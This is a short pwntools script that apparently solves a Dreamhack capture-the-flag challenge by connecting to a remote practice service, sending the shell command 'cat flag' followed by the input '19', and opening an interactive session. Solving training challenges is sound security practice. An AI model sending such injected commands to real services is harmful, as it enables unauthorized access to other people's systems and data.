from pwn import *

p = remote('host1.dreamhack.games', 8519)
p.recvrepeat(1)
p.sendline('cat flag')
p.recvrepeat(1)
p.sendline('19')

p.interactive()
